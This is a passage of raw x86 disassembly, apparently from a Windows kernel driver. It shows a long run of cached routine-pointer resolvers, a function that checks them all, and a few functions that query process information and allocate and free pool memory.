   115f1:	lea    eax,[ebp-0x8]
   115f4:	push   eax
   115f5:	call   DWORD PTR ds:0x1ee64
   115fb:	leave  
   115fc:	ret    0x4
   115ff:	int3   
   11600:	int3   
   11601:	int3   
   11602:	int3   
   11603:	int3   
   11604:	mov    edi,edi
   11606:	push   ebp
   11607:	mov    ebp,esp
   11609:	cmp    DWORD PTR [ebp+0x8],0x0
   1160d:	jge    0x11613
   1160f:	and    DWORD PTR [ebp+0x8],0x0
   11613:	push   DWORD PTR [ebp+0x8]
   11616:	call   0x10a52
   1161b:	pop    ecx
   1161c:	pop    ebp
   1161d:	ret    0x8
   11620:	int3   
   11621:	int3   
   11622:	int3   
   11623:	int3   
   11624:	int3   
   11625:	int3   
   11626:	mov    edi,edi
   11628:	push   ebp
   11629:	mov    ebp,esp
   1162b:	mov    eax,DWORD PTR [ebp+0x8]
   1162e:	test   eax,eax
   11630:	je     0x1163f
   11632:	mov    ecx,DWORD PTR [ebp+0xc]
   11635:	mov    edx,DWORD PTR [ecx]
   11637:	mov    DWORD PTR [eax],edx
   11639:	mov    ecx,DWORD PTR [ecx+0x4]
   1163c:	mov    DWORD PTR [eax+0x4],ecx
   1163f:	pop    ebp
   11640:	ret    0x8
   11643:	int3   
   11644:	int3   
   11645:	int3   
   11646:	int3   
   11647:	int3   
   11648:	mov    edi,edi
   1164a:	push   ebp
   1164b:	mov    ebp,esp
   1164d:	push   esi
   1164e:	mov    esi,ecx
   11650:	call   0x1107c
   11655:	test   BYTE PTR [ebp+0x8],0x1
   11659:	je     0x11662
   1165b:	push   esi
   1165c:	call   0x1d9f8
   11661:	pop    ecx
   11662:	mov    eax,esi
   11664:	pop    esi
   11665:	pop    ebp
   11666:	ret    0x4
   11669:	int3   
   1166a:	int3   
   1166b:	int3   
   1166c:	int3   
   1166d:	int3   
   1166e:	test   BYTE PTR ds:0x7f8dc,0x1
   11675:	jne    0x1168d
   11677:	or     DWORD PTR ds:0x7f8dc,0x1
   1167e:	push   0x1df04
   11683:	call   0x115c2
   11688:	mov    ds:0x7f8d8,eax
   1168d:	mov    eax,ds:0x7f8d8
   11692:	ret    
   11693:	int3   
   11694:	int3   
   11695:	int3   
   11696:	int3   
   11697:	int3   
   11698:	test   BYTE PTR ds:0x7f8e4,0x1
   1169f:	jne    0x116b7
   116a1:	or     DWORD PTR ds:0x7f8e4,0x1
   116a8:	push   0x1df20
   116ad:	call   0x115c2
   116b2:	mov    ds:0x7f8e0,eax
   116b7:	mov    eax,ds:0x7f8e0
   116bc:	ret    
   116bd:	int3   
   116be:	int3   
   116bf:	int3   
   116c0:	int3   
   116c1:	int3   
   116c2:	test   BYTE PTR ds:0x7f8ec,0x1
   116c9:	jne    0x116e1
   116cb:	or     DWORD PTR ds:0x7f8ec,0x1
   116d2:	push   0x1df58
   116d7:	call   0x115c2
   116dc:	mov    ds:0x7f8e8,eax
   116e1:	mov    eax,ds:0x7f8e8
   116e6:	ret    
   116e7:	int3   
   116e8:	int3   
   116e9:	int3   
   116ea:	int3   
   116eb:	int3   
   116ec:	test   BYTE PTR ds:0x7f8f4,0x1
   116f3:	jne    0x1170b
   116f5:	or     DWORD PTR ds:0x7f8f4,0x1
   116fc:	push   0x1df7a
   11701:	call   0x115c2
   11706:	mov    ds:0x7f8f0,eax
   1170b:	mov    eax,ds:0x7f8f0
   11710:	ret    
   11711:	int3   
   11712:	int3   
   11713:	int3   
   11714:	int3   
   11715:	int3   
   11716:	test   BYTE PTR ds:0x7f8fc,0x1
   1171d:	jne    0x11735
   1171f:	or     DWORD PTR ds:0x7f8fc,0x1
   11726:	push   0x1dfba
   1172b:	call   0x115c2
   11730:	mov    ds:0x7f8f8,eax
   11735:	mov    eax,ds:0x7f8f8
   1173a:	ret    
   1173b:	int3   
   1173c:	int3   
   1173d:	int3   
   1173e:	int3   
   1173f:	int3   
   11740:	test   BYTE PTR ds:0x7f904,0x1
   11747:	jne    0x1175f
   11749:	or     DWORD PTR ds:0x7f904,0x1
   11750:	push   0x1dfd0
   11755:	call   0x115c2
   1175a:	mov    ds:0x7f900,eax
   1175f:	mov    eax,ds:0x7f900
   11764:	ret    
   11765:	int3   
   11766:	int3   
   11767:	int3   
   11768:	int3   
   11769:	int3   
   1176a:	test   BYTE PTR ds:0x7f90c,0x1
   11771:	jne    0x11789
   11773:	or     DWORD PTR ds:0x7f90c,0x1
   1177a:	push   0x1e004
   1177f:	call   0x115c2
   11784:	mov    ds:0x7f908,eax
   11789:	mov    eax,ds:0x7f908
   1178e:	ret    
   1178f:	int3   
   11790:	int3   
   11791:	int3   
   11792:	int3   
   11793:	int3   
   11794:	test   BYTE PTR ds:0x7f914,0x1
   1179b:	jne    0x117b3
   1179d:	or     DWORD PTR ds:0x7f914,0x1
   117a4:	push   0x1e036
   117a9:	call   0x115c2
   117ae:	mov    ds:0x7f910,eax
   117b3:	mov    eax,ds:0x7f910
   117b8:	ret    
   117b9:	int3   
   117ba:	int3   
   117bb:	int3   
   117bc:	int3   
   117bd:	int3   
   117be:	test   BYTE PTR ds:0x7f91c,0x1
   117c5:	jne    0x117dd
   117c7:	or     DWORD PTR ds:0x7f91c,0x1
   117ce:	push   0x1e04a
   117d3:	call   0x115c2
   117d8:	mov    ds:0x7f918,eax
   117dd:	mov    eax,ds:0x7f918
   117e2:	ret    
   117e3:	int3   
   117e4:	int3   
   117e5:	int3   
   117e6:	int3   
   117e7:	int3   
   117e8:	test   BYTE PTR ds:0x7f924,0x1
   117ef:	jne    0x11807
   117f1:	or     DWORD PTR ds:0x7f924,0x1
   117f8:	push   0x1e062
   117fd:	call   0x115c2
   11802:	mov    ds:0x7f920,eax
   11807:	mov    eax,ds:0x7f920
   1180c:	ret    
   1180d:	int3   
   1180e:	int3   
   1180f:	int3   
   11810:	int3   
   11811:	int3   
   11812:	test   BYTE PTR ds:0x7f92c,0x1
   11819:	jne    0x11831
   1181b:	or     DWORD PTR ds:0x7f92c,0x1
   11822:	push   0x1e07e
   11827:	call   0x115c2
   1182c:	mov    ds:0x7f928,eax
   11831:	mov    eax,ds:0x7f928
   11836:	ret    
   11837:	int3   
   11838:	int3   
   11839:	int3   
   1183a:	int3   
   1183b:	int3   
   1183c:	test   BYTE PTR ds:0x7f934,0x1
   11843:	jne    0x1185b
   11845:	or     DWORD PTR ds:0x7f934,0x1
   1184c:	push   0x1e0b8
   11851:	call   0x115c2
   11856:	mov    ds:0x7f930,eax
   1185b:	mov    eax,ds:0x7f930
   11860:	ret    
   11861:	int3   
   11862:	int3   
   11863:	int3   
   11864:	int3   
   11865:	int3   
   11866:	test   BYTE PTR ds:0x7f93c,0x1
   1186d:	jne    0x11885
   1186f:	or     DWORD PTR ds:0x7f93c,0x1
   11876:	push   0x1e0d2
   1187b:	call   0x115c2
   11880:	mov    ds:0x7f938,eax
   11885:	mov    eax,ds:0x7f938
   1188a:	ret    
   1188b:	int3   
   1188c:	int3   
   1188d:	int3   
   1188e:	int3   
   1188f:	int3   
   11890:	test   BYTE PTR ds:0x7f944,0x1
   11897:	jne    0x118af
   11899:	or     DWORD PTR ds:0x7f944,0x1
   118a0:	push   0x1e0f4
   118a5:	call   0x115c2
   118aa:	mov    ds:0x7f940,eax
   118af:	mov    eax,ds:0x7f940
   118b4:	ret    
   118b5:	int3   
   118b6:	int3   
   118b7:	int3   
   118b8:	int3   
   118b9:	int3   
   118ba:	test   BYTE PTR ds:0x7f94c,0x1
   118c1:	jne    0x118d9
   118c3:	or     DWORD PTR ds:0x7f94c,0x1
   118ca:	push   0x1e12e
   118cf:	call   0x115c2
   118d4:	mov    ds:0x7f948,eax
   118d9:	mov    eax,ds:0x7f948
   118de:	ret    
   118df:	int3   
   118e0:	int3   
   118e1:	int3   
   118e2:	int3   
   118e3:	int3   
   118e4:	test   BYTE PTR ds:0x7f954,0x1
   118eb:	jne    0x11903
   118ed:	or     DWORD PTR ds:0x7f954,0x1
   118f4:	push   0x1e154
   118f9:	call   0x115c2
   118fe:	mov    ds:0x7f950,eax
   11903:	mov    eax,ds:0x7f950
   11908:	ret    
   11909:	int3   
   1190a:	int3   
   1190b:	int3   
   1190c:	int3   
   1190d:	int3   
   1190e:	test   BYTE PTR ds:0x7f95c,0x1
   11915:	jne    0x1192d
   11917:	or     DWORD PTR ds:0x7f95c,0x1
   1191e:	push   0x1e184
   11923:	call   0x115c2
   11928:	mov    ds:0x7f958,eax
   1192d:	mov    eax,ds:0x7f958
   11932:	ret    
   11933:	int3   
   11934:	int3   
   11935:	int3   
   11936:	int3   
   11937:	int3   
   11938:	test   BYTE PTR ds:0x7f964,0x1
   1193f:	jne    0x11957
   11941:	or     DWORD PTR ds:0x7f964,0x1
   11948:	push   0x1e1b6
   1194d:	call   0x115c2
   11952:	mov    ds:0x7f960,eax
   11957:	mov    eax,ds:0x7f960
   1195c:	ret    
   1195d:	int3   
   1195e:	int3   
   1195f:	int3   
   11960:	int3   
   11961:	int3   
   11962:	test   BYTE PTR ds:0x7f96c,0x1
   11969:	jne    0x11981
   1196b:	or     DWORD PTR ds:0x7f96c,0x1
   11972:	push   0x1e1ca
   11977:	call   0x115c2
   1197c:	mov    ds:0x7f968,eax
   11981:	mov    eax,ds:0x7f968
   11986:	ret    
   11987:	int3   
   11988:	int3   
   11989:	int3   
   1198a:	int3   
   1198b:	int3   
   1198c:	test   BYTE PTR ds:0x7f974,0x1
   11993:	jne    0x119ab
   11995:	or     DWORD PTR ds:0x7f974,0x1
   1199c:	push   0x1e1e8
   119a1:	call   0x115c2
   119a6:	mov    ds:0x7f970,eax
   119ab:	mov    eax,ds:0x7f970
   119b0:	ret    
   119b1:	int3   
   119b2:	int3   
   119b3:	int3   
   119b4:	int3   
   119b5:	int3   
   119b6:	test   BYTE PTR ds:0x7f97c,0x1
   119bd:	jne    0x119d5
   119bf:	or     DWORD PTR ds:0x7f97c,0x1
   119c6:	push   0x1e202
   119cb:	call   0x115c2
   119d0:	mov    ds:0x7f978,eax
   119d5:	mov    eax,ds:0x7f978
   119da:	ret    
   119db:	int3   
   119dc:	int3   
   119dd:	int3   
   119de:	int3   
   119df:	int3   
   119e0:	test   BYTE PTR ds:0x7f984,0x1
   119e7:	jne    0x119ff
   119e9:	or     DWORD PTR ds:0x7f984,0x1
   119f0:	push   0x1e21a
   119f5:	call   0x115c2
   119fa:	mov    ds:0x7f980,eax
   119ff:	mov    eax,ds:0x7f980
   11a04:	ret    
   11a05:	int3   
   11a06:	int3   
   11a07:	int3   
   11a08:	int3   
   11a09:	int3   
   11a0a:	test   BYTE PTR ds:0x7f98c,0x1
   11a11:	jne    0x11a29
   11a13:	or     DWORD PTR ds:0x7f98c,0x1
   11a1a:	push   0x1e238
   11a1f:	call   0x115c2
   11a24:	mov    ds:0x7f988,eax
   11a29:	mov    eax,ds:0x7f988
   11a2e:	ret    
   11a2f:	int3   
   11a30:	int3   
   11a31:	int3   
   11a32:	int3   
   11a33:	int3   
   11a34:	test   BYTE PTR ds:0x7f994,0x1
   11a3b:	jne    0x11a53
   11a3d:	or     DWORD PTR ds:0x7f994,0x1
   11a44:	push   0x1e258
   11a49:	call   0x115c2
   11a4e:	mov    ds:0x7f990,eax
   11a53:	mov    eax,ds:0x7f990
   11a58:	ret    
   11a59:	int3   
   11a5a:	int3   
   11a5b:	int3   
   11a5c:	int3   
   11a5d:	int3   
   11a5e:	test   BYTE PTR ds:0x7f99c,0x1
   11a65:	jne    0x11a7d
   11a67:	or     DWORD PTR ds:0x7f99c,0x1
   11a6e:	push   0x1e278
   11a73:	call   0x115c2
   11a78:	mov    ds:0x7f998,eax
   11a7d:	mov    eax,ds:0x7f998
   11a82:	ret    
   11a83:	int3   
   11a84:	int3   
   11a85:	int3   
   11a86:	int3   
   11a87:	int3   
   11a88:	test   BYTE PTR ds:0x7f9a4,0x1
   11a8f:	jne    0x11aa7
   11a91:	or     DWORD PTR ds:0x7f9a4,0x1
   11a98:	push   0x1e298
   11a9d:	call   0x115c2
   11aa2:	mov    ds:0x7f9a0,eax
   11aa7:	mov    eax,ds:0x7f9a0
   11aac:	ret    
   11aad:	int3   
   11aae:	int3   
   11aaf:	int3   
   11ab0:	int3   
   11ab1:	int3   
   11ab2:	test   BYTE PTR ds:0x7f9ac,0x1
   11ab9:	jne    0x11ad1
   11abb:	or     DWORD PTR ds:0x7f9ac,0x1
   11ac2:	push   0x1e2ae
   11ac7:	call   0x115c2
   11acc:	mov    ds:0x7f9a8,eax
   11ad1:	mov    eax,ds:0x7f9a8
   11ad6:	ret    
   11ad7:	int3   
   11ad8:	int3   
   11ad9:	int3   
   11ada:	int3   
   11adb:	int3   
   11adc:	test   BYTE PTR ds:0x7f9b4,0x1
   11ae3:	jne    0x11afb
   11ae5:	or     DWORD PTR ds:0x7f9b4,0x1
   11aec:	push   0x1e2d8
   11af1:	call   0x115c2
   11af6:	mov    ds:0x7f9b0,eax
   11afb:	mov    eax,ds:0x7f9b0
   11b00:	ret    
   11b01:	int3   
   11b02:	int3   
   11b03:	int3   
   11b04:	int3   
   11b05:	int3   
   11b06:	test   BYTE PTR ds:0x7f9bc,0x1
   11b0d:	jne    0x11b25
   11b0f:	or     DWORD PTR ds:0x7f9bc,0x1
   11b16:	push   0x1e2f0
   11b1b:	call   0x115c2
   11b20:	mov    ds:0x7f9b8,eax
   11b25:	mov    eax,ds:0x7f9b8
   11b2a:	ret    
   11b2b:	int3   
   11b2c:	int3   
   11b2d:	int3   
   11b2e:	int3   
   11b2f:	int3   
   11b30:	test   BYTE PTR ds:0x7f9c4,0x1
   11b37:	jne    0x11b4f
   11b39:	or     DWORD PTR ds:0x7f9c4,0x1
   11b40:	push   0x1e31e
   11b45:	call   0x115c2
   11b4a:	mov    ds:0x7f9c0,eax
   11b4f:	mov    eax,ds:0x7f9c0
   11b54:	ret    
   11b55:	int3   
   11b56:	int3   
   11b57:	int3   
   11b58:	int3   
   11b59:	int3   
   11b5a:	test   BYTE PTR ds:0x7f9cc,0x1
   11b61:	jne    0x11b79
   11b63:	or     DWORD PTR ds:0x7f9cc,0x1
   11b6a:	push   0x1e348
   11b6f:	call   0x115c2
   11b74:	mov    ds:0x7f9c8,eax
   11b79:	mov    eax,ds:0x7f9c8
   11b7e:	ret    
   11b7f:	int3   
   11b80:	int3   
   11b81:	int3   
   11b82:	int3   
   11b83:	int3   
   11b84:	test   BYTE PTR ds:0x7f9d4,0x1
   11b8b:	jne    0x11ba3
   11b8d:	or     DWORD PTR ds:0x7f9d4,0x1
   11b94:	push   0x1e366
   11b99:	call   0x115c2
   11b9e:	mov    ds:0x7f9d0,eax
   11ba3:	mov    eax,ds:0x7f9d0
   11ba8:	ret    
   11ba9:	int3   
   11baa:	int3   
   11bab:	int3   
   11bac:	int3   
   11bad:	int3   
   11bae:	test   BYTE PTR ds:0x7f9dc,0x1
   11bb5:	jne    0x11bcd
   11bb7:	or     DWORD PTR ds:0x7f9dc,0x1
   11bbe:	push   0x1e394
   11bc3:	call   0x115c2
   11bc8:	mov    ds:0x7f9d8,eax
   11bcd:	mov    eax,ds:0x7f9d8
   11bd2:	ret    
   11bd3:	int3   
   11bd4:	int3   
   11bd5:	int3   
   11bd6:	int3   
   11bd7:	int3   
   11bd8:	test   BYTE PTR ds:0x7f9e4,0x1
   11bdf:	jne    0x11bf7
   11be1:	or     DWORD PTR ds:0x7f9e4,0x1
   11be8:	push   0x1e3ba
   11bed:	call   0x115c2
   11bf2:	mov    ds:0x7f9e0,eax
   11bf7:	mov    eax,ds:0x7f9e0
   11bfc:	ret    
   11bfd:	int3   
   11bfe:	int3   
   11bff:	int3   
   11c00:	int3   
   11c01:	int3   
   11c02:	test   BYTE PTR ds:0x7f9ec,0x1
   11c09:	jne    0x11c21
   11c0b:	or     DWORD PTR ds:0x7f9ec,0x1
   11c12:	push   0x1e3e4
   11c17:	call   0x115c2
   11c1c:	mov    ds:0x7f9e8,eax
   11c21:	mov    eax,ds:0x7f9e8
   11c26:	ret    
   11c27:	int3   
   11c28:	int3   
   11c29:	int3   
   11c2a:	int3   
   11c2b:	int3   
   11c2c:	test   BYTE PTR ds:0x7f9f4,0x1
   11c33:	jne    0x11c4b
   11c35:	or     DWORD PTR ds:0x7f9f4,0x1
   11c3c:	push   0x1e408
   11c41:	call   0x115c2
   11c46:	mov    ds:0x7f9f0,eax
   11c4b:	mov    eax,ds:0x7f9f0
   11c50:	ret    
   11c51:	int3   
   11c52:	int3   
   11c53:	int3   
   11c54:	int3   
   11c55:	int3   
   11c56:	test   BYTE PTR ds:0x7f9fc,0x1
   11c5d:	jne    0x11c75
   11c5f:	or     DWORD PTR ds:0x7f9fc,0x1
   11c66:	push   0x1e432
   11c6b:	call   0x115c2
   11c70:	mov    ds:0x7f9f8,eax
   11c75:	mov    eax,ds:0x7f9f8
   11c7a:	ret    
   11c7b:	int3   
   11c7c:	int3   
   11c7d:	int3   
   11c7e:	int3   
   11c7f:	int3   
   11c80:	test   BYTE PTR ds:0x7fa04,0x1
   11c87:	jne    0x11c9f
   11c89:	or     DWORD PTR ds:0x7fa04,0x1
   11c90:	push   0x1e45c
   11c95:	call   0x115c2
   11c9a:	mov    ds:0x7fa00,eax
   11c9f:	mov    eax,ds:0x7fa00
   11ca4:	ret    
   11ca5:	int3   
   11ca6:	int3   
   11ca7:	int3   
   11ca8:	int3   
   11ca9:	int3   
   11caa:	test   BYTE PTR ds:0x7fa0c,0x1
   11cb1:	jne    0x11cc9
   11cb3:	or     DWORD PTR ds:0x7fa0c,0x1
   11cba:	push   0x1e492
   11cbf:	call   0x115c2
   11cc4:	mov    ds:0x7fa08,eax
   11cc9:	mov    eax,ds:0x7fa08
   11cce:	ret    
   11ccf:	int3   
   11cd0:	int3   
   11cd1:	int3   
   11cd2:	int3   
   11cd3:	int3   
   11cd4:	call   0x1166e
   11cd9:	test   eax,eax
   11cdb:	jne    0x11ce0
   11cdd:	xor    eax,eax
   11cdf:	ret    
   11ce0:	call   0x11698
   11ce5:	test   eax,eax
   11ce7:	je     0x11cdd
   11ce9:	call   0x116c2
   11cee:	test   eax,eax
   11cf0:	je     0x11cdd
   11cf2:	call   0x116ec
   11cf7:	test   eax,eax
   11cf9:	je     0x11cdd
   11cfb:	call   0x11716
   11d00:	test   eax,eax
   11d02:	je     0x11cdd
   11d04:	call   0x11740
   11d09:	test   eax,eax
   11d0b:	je     0x11cdd
   11d0d:	call   0x1176a
   11d12:	test   eax,eax
   11d14:	je     0x11cdd
   11d16:	call   0x11794
   11d1b:	test   eax,eax
   11d1d:	je     0x11cdd
   11d1f:	call   0x117be
   11d24:	test   eax,eax
   11d26:	je     0x11cdd
   11d28:	call   0x117e8
   11d2d:	test   eax,eax
   11d2f:	je     0x11cdd
   11d31:	call   0x11812
   11d36:	test   eax,eax
   11d38:	je     0x11cdd
   11d3a:	call   0x1183c
   11d3f:	test   eax,eax
   11d41:	je     0x11cdd
   11d43:	call   0x11866
   11d48:	test   eax,eax
   11d4a:	je     0x11cdd
   11d4c:	call   0x11890
   11d51:	test   eax,eax
   11d53:	je     0x11cdd
   11d55:	call   0x118ba
   11d5a:	test   eax,eax
   11d5c:	je     0x11cdd
   11d62:	call   0x118e4
   11d67:	test   eax,eax
   11d69:	je     0x11cdd
   11d6f:	call   0x1190e
   11d74:	test   eax,eax
   11d76:	je     0x11cdd
   11d7c:	call   0x11938
   11d81:	test   eax,eax
   11d83:	je     0x11cdd
   11d89:	call   0x11962
   11d8e:	test   eax,eax
   11d90:	je     0x11cdd
   11d96:	call   0x1198c
   11d9b:	test   eax,eax
   11d9d:	je     0x11cdd
   11da3:	call   0x119b6
   11da8:	test   eax,eax
   11daa:	je     0x11cdd
   11db0:	call   0x119e0
   11db5:	test   eax,eax
   11db7:	je     0x11cdd
   11dbd:	call   0x11a0a
   11dc2:	test   eax,eax
   11dc4:	je     0x11cdd
   11dca:	call   0x11a34
   11dcf:	test   eax,eax
   11dd1:	je     0x11cdd
   11dd7:	call   0x11a5e
   11ddc:	test   eax,eax
   11dde:	je     0x11cdd
   11de4:	call   0x11a88
   11de9:	test   eax,eax
   11deb:	je     0x11cdd
   11df1:	call   0x11ab2
   11df6:	test   eax,eax
   11df8:	je     0x11cdd
   11dfe:	call   0x11adc
   11e03:	test   eax,eax
   11e05:	je     0x11cdd
   11e0b:	call   0x11b06
   11e10:	test   eax,eax
   11e12:	je     0x11cdd
   11e18:	call   0x11b30
   11e1d:	test   eax,eax
   11e1f:	je     0x11cdd
   11e25:	call   0x11b5a
   11e2a:	test   eax,eax
   11e2c:	je     0x11cdd
   11e32:	call   0x11b84
   11e37:	test   eax,eax
   11e39:	je     0x11cdd
   11e3f:	call   0x11bae
   11e44:	test   eax,eax
   11e46:	je     0x11cdd
   11e4c:	call   0x11bd8
   11e51:	test   eax,eax
   11e53:	je     0x11cdd
   11e59:	call   0x11c02
   11e5e:	test   eax,eax
   11e60:	je     0x11cdd
   11e66:	call   0x11c2c
   11e6b:	test   eax,eax
   11e6d:	je     0x11cdd
   11e73:	call   0x11c56
   11e78:	test   eax,eax
   11e7a:	je     0x11cdd
   11e80:	call   0x11c80
   11e85:	test   eax,eax
   11e87:	je     0x11cdd
   11e8d:	call   0x11caa
   11e92:	neg    eax
   11e94:	sbb    eax,eax
   11e96:	neg    eax
   11e98:	ret    
   11e99:	int3   
   11e9a:	int3   
   11e9b:	int3   
   11e9c:	int3   
   11e9d:	int3   
   11e9e:	mov    edi,edi
   11ea0:	push   esi
   11ea1:	mov    esi,ecx
   11ea3:	push   DWORD PTR [esi+0x48]
   11ea6:	call   0x1d9f8
   11eab:	push   DWORD PTR [esi+0x24]
   11eae:	call   0x1d9f8
   11eb3:	push   DWORD PTR [esi+0x1c]
   11eb6:	call   0x1d9f8
   11ebb:	push   DWORD PTR [esi+0x14]
   11ebe:	call   0x1d9f8
   11ec3:	push   DWORD PTR [esi+0x8]
   11ec6:	call   0x1d9f8
   11ecb:	push   DWORD PTR [esi]
   11ecd:	call   0x1d9f8
   11ed2:	add    esp,0x18
   11ed5:	pop    esi
   11ed6:	ret    
   11ed7:	int3   
   11ed8:	int3   
   11ed9:	int3   
   11eda:	int3   
   11edb:	int3   
   11edc:	mov    edi,edi
   11ede:	push   ebp
   11edf:	mov    ebp,esp
   11ee1:	mov    eax,ecx
   11ee3:	mov    ecx,DWORD PTR [ebp+0x8]
   11ee6:	mov    edx,DWORD PTR [ecx]
   11ee8:	test   edx,edx
   11eea:	je     0x11ef3
   11eec:	mov    DWORD PTR [eax],edx
   11eee:	inc    DWORD PTR [edx+0x4]
   11ef1:	jmp    0x11ef6
   11ef3:	and    DWORD PTR [eax],0x0
   11ef6:	pop    ebp
   11ef7:	ret    0x4
   11efa:	int3   
   11efb:	int3   
   11efc:	int3   
   11efd:	int3   
   11efe:	int3   
   11eff:	int3   
   11f00:	mov    edi,edi
   11f02:	push   ebp
   11f03:	mov    ebp,esp
   11f05:	push   esi
   11f06:	mov    esi,ecx
   11f08:	mov    ecx,DWORD PTR [esi]
   11f0a:	test   ecx,ecx
   11f0c:	je     0x11f13
   11f0e:	call   0x10a86
   11f13:	mov    eax,DWORD PTR [ebp+0x8]
   11f16:	mov    eax,DWORD PTR [eax]
   11f18:	mov    DWORD PTR [esi],eax
   11f1a:	inc    DWORD PTR [eax+0x4]
   11f1d:	mov    eax,esi
   11f1f:	pop    esi
   11f20:	pop    ebp
   11f21:	ret    0x4
   11f24:	int3   
   11f25:	int3   
   11f26:	int3   
   11f27:	int3   
   11f28:	int3   
   11f29:	int3   
   11f2a:	mov    edi,edi
   11f2c:	push   ebp
   11f2d:	mov    ebp,esp
   11f2f:	push   ebx
   11f30:	push   esi
   11f31:	push   edi
   11f32:	mov    edi,DWORD PTR [ebp+0xc]
   11f35:	mov    esi,ecx
   11f37:	and    DWORD PTR [esi+0x4],0x0
   11f3b:	lea    eax,[edi+0x1]
   11f3e:	push   eax
   11f3f:	mov    DWORD PTR [esi+0x8],edi
   11f42:	call   0x10a52
   11f47:	push   edi
   11f48:	push   DWORD PTR [ebp+0x8]
   11f4b:	mov    ebx,eax
   11f4d:	push   ebx
   11f4e:	call   0x1da7a
   11f53:	add    esp,0x10
   11f56:	inc    DWORD PTR [esi+0x4]
   11f59:	pop    edi
   11f5a:	mov    DWORD PTR [esi],ebx
   11f5c:	mov    eax,esi
   11f5e:	pop    esi
   11f5f:	pop    ebx
   11f60:	pop    ebp
   11f61:	ret    0x8
   11f64:	int3   
   11f65:	int3   
   11f66:	int3   
   11f67:	int3   
   11f68:	int3   
   11f69:	int3   
   11f6a:	mov    edi,edi
   11f6c:	push   ebp
   11f6d:	mov    ebp,esp
   11f6f:	push   ecx
   11f70:	push   edi
   11f71:	lea    eax,[ebp-0x4]
   11f74:	push   eax
   11f75:	xor    edi,edi
   11f77:	push   edi
   11f78:	push   edi
   11f79:	push   0x1b
   11f7b:	push   DWORD PTR [ebp+0x8]
   11f7e:	call   0x11740
   11f83:	call   eax
   11f85:	cmp    eax,0xc0000004
   11f8a:	jne    0x11ff2
   11f8c:	mov    ecx,DWORD PTR [ebp-0x4]
   11f8f:	push   ebx
   11f90:	mov    ebx,DWORD PTR [ebp+0xc]
   11f93:	movzx  edx,WORD PTR [ebx+0x2]
   11f97:	lea    eax,[ecx-0x8]
   11f9a:	cmp    edx,eax
   11f9c:	jae    0x11fa8
   11f9e:	mov    WORD PTR [ebx],ax
   11fa1:	mov    eax,0x80000005
   11fa6:	jmp    0x11ff1
   11fa8:	push   esi
   11fa9:	push   0x20736649
   11fae:	push   ecx
   11faf:	push   edi
   11fb0:	call   DWORD PTR ds:0x1ee2c
   11fb6:	mov    esi,eax
   11fb8:	cmp    esi,edi
   11fba:	jne    0x11fc3
   11fbc:	mov    eax,0xc000009a
   11fc1:	jmp    0x11ff0
   11fc3:	lea    eax,[ebp-0x4]
   11fc6:	push   eax
   11fc7:	push   DWORD PTR [ebp-0x4]
   11fca:	push   esi
   11fcb:	push   0x1b
   11fcd:	push   DWORD PTR [ebp+0x8]
   11fd0:	call   0x11740
   11fd5:	call   eax
   11fd7:	mov    edi,eax
   11fd9:	test   edi,edi
   11fdb:	jl     0x11fe5
   11fdd:	push   esi
   11fde:	push   ebx
   11fdf:	call   DWORD PTR ds:0x1ee34
   11fe5:	push   0x0
   11fe7:	push   esi
   11fe8:	call   DWORD PTR ds:0x1ee1c
   11fee:	mov    eax,edi
   11ff0:	pop    esi
   11ff1:	pop    ebx
   11ff2:	pop    edi
   11ff3:	leave  
   11ff4:	ret    0x8
   11ff7:	int3   
   11ff8:	int3   
   11ff9:	int3   
   11ffa:	int3   
   11ffb:	int3   
   11ffc:	mov    edi,edi
   11ffe:	push   ebp
   11fff:	mov    ebp,esp
   12001:	sub    esp,0x18
   12004:	push   0x0
   12006:	push   0x18
   12008:	lea    eax,[ebp-0x18]
   1200b:	push   eax
   1200c:	push   0x0
   1200e:	push   DWORD PTR [ebp+0x8]
   12011:	call   0x11740
   12016:	call   eax
   12018:	test   eax,eax
   1201a:	jl     0x12021
   1201c:	mov    eax,DWORD PTR [ebp-0x8]
   1201f:	jmp    0x12023
   12021:	xor    eax,eax
   12023:	leave  
   12024:	ret    0x4
   12027:	int3   
   12028:	int3   
   12029:	int3   
   1202a:	int3   
   1202b:	int3   
   1202c:	mov    edi,edi
   1202e:	push   ebp
   1202f:	mov    ebp,esp
   12031:	mov    ecx,DWORD PTR ds:0x7efac
   12037:	sub    esp,0x38
   1203a:	push   esi
   1203b:	xor    esi,esi
   1203d:	cmp    ecx,esi
   1203f:	jne    0x12049
   12041:	or     eax,0xffffffff
   12044:	jmp    0x12124
   12049:	push   edi
   1204a:	xor    eax,eax
   1204c:	mov    DWORD PTR [ebp-0x20],esi
   1204f:	lea    edi,[ebp-0x1c]
   12052:	stos   DWORD PTR es:[edi],eax
   12053:	lea    eax,[ebp-0x18]
   12056:	push   eax
   12057:	lea    eax,[ebp-0x38]
   1205a:	push   eax
   1205b:	push   0x400
   12060:	lea    eax,[ebp-0x10]
   12063:	push   eax
   12064:	mov    DWORD PTR [ebp-0x4],esi
   12067:	mov    DWORD PTR [ebp-0x38],0x18
   1206e:	mov    DWORD PTR [ebp-0x34],esi
   12071:	mov    DWORD PTR [ebp-0x2c],esi
   12074:	mov    DWORD PTR [ebp-0x30],esi
   12077:	mov    DWORD PTR [ebp-0x28],esi
   1207a:	mov    DWORD PTR [ebp-0x24],esi
   1207d:	mov    DWORD PTR [ebp-0x18],ecx
   12080:	mov    DWORD PTR [ebp-0x14],esi
   12083:	call   0x1166e
   12088:	call   eax
   1208a:	mov    edi,eax
   1208c:	cmp    edi,esi
   1208e:	jl     0x12121
   12094:	push   ebx
   12095:	lea    eax,[ebp-0xc]
   12098:	push   eax
   12099:	push   0x8
   1209b:	push   DWORD PTR [ebp-0x10]
   1209e:	call   0x118ba
   120a3:	call   eax
   120a5:	mov    ebx,DWORD PTR ds:0x1ee60
   120ab:	mov    edi,eax
   120ad:	cmp    edi,esi
   120af:	jl     0x1211b
   120b1:	lea    eax,[ebp-0x4]
   120b4:	push   eax
   120b5:	push   0x1
   120b7:	push   esi
   120b8:	push   esi
   120b9:	push   0x1
   120bb:	push   DWORD PTR [ebp-0xc]
   120be:	call   0x116c2
   120c3:	call   eax
   120c5:	mov    edi,eax
   120c7:	cmp    edi,esi
   120c9:	jl     0x12116
   120cb:	mov    eax,DWORD PTR [ebp+0x8]
   120ce:	mov    DWORD PTR [ebp-0x18],eax
   120d1:	lea    eax,[ebp-0x18]
   120d4:	push   eax
   120d5:	lea    eax,[ebp-0x38]
   120d8:	push   eax
   120d9:	push   0x200
   120de:	lea    eax,[ebp-0x8]
   120e1:	push   eax
   120e2:	call   0x1166e
   120e7:	call   eax
   120e9:	mov    edi,eax
